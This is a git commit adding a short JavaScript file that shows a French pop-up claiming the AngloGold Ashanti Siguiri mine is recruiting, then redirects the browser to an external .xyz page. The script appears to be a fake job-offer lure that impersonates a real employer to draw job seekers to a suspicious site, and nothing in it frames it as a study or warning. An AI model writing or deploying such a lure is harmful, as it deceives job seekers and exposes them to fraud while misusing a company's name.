15a6284e3d1e0d153f4c5aa2b9b44fb824d4e820
bigetijazz28 <bigetijazz28@gmail.com>
2025-08-21 11:53:31 +0100

    Create suguiri.js

---
+++ suguiri.js
@@ -0,0 +1,6 @@
+
+var password = 'Suguiri Recruitment'
+password=prompt('AVIS: La mine AngloGold Ashanti Suguiri recrute actuellement, appuyez sur OK pour postuler.','Suguiri Recruitment');
+if (password != 'Suguiri Recruitment') {
+location.href='https://www.ekuula.xyz/Siguiri-Mine-Recrutement';
+}
